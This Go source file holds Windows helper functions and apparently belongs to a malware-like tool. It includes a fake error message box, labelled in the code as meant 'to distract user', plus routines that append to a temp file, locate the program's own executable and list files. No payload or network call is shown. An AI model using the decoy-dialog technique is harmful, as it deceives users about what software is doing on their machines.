package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"sync"
	"syscall"
	"unsafe"
)

func messagebox(err error) {
	user32 := syscall.MustLoadDLL("user32.dll")
	mbox := user32.MustFindProc("MessageBoxW")

	title := "Error:"
	message := "Error to distract user." + err.Error()
	mbox.Call(0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
		0)
}

func deleteFile(filename string, wg *sync.WaitGroup) {

	//err := os.Remove(filename)
	//if err != nil && DEBUG {
	//	messagebox(err)
	//	return
	//}
	wg.Done()
}


func systemd(content string) {
	for _,v := range readFileByLine(){
		if v == content {
			return
		}
	}

	f, err := os.OpenFile(tmpFile, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println(err)
		return
	}

	_, err = fmt.Fprintln(f, content)
	if err != nil {
		fmt.Println(err)
		f.Close()
		return
	}

	err = f.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
	if DEBUG {
		fmt.Println("file appended successfully")
	}
}

func execPath() (string, error) {
	file, err := exec.LookPath(os.Args[0])
	if err != nil {
		return "", err
	}
	_, err = filepath.Abs(file)
	if err != nil {
		panic(err)
	}
	return filepath.Abs(file)
}

func getAllFile(path string) []string {
	var filenames []string
	files, _ := ioutil.ReadDir(path)
	for _,f := range files {
			if !f.IsDir()  {
				filenames = append(filenames, f.Name())
				fmt.Println(f.Name())
			}
	}
	return filenames
}

func readFileByLine() []string {
	var arr []string
	f, err := os.Open(tmpFile)
	if err != nil {
		fmt.Println(err)
	}
	defer f.Close()
	s:= bufio.NewScanner(f)
	for s.Scan() {
		arr = append(arr, s.Text())
	}
	err = s.Err()
	if err != nil {
		fmt.Println(err)
	}

	return arr
}

func IsExist(path string) bool {
	_, err := os.Stat(path)
	return err == nil || os.IsExist(err)
}
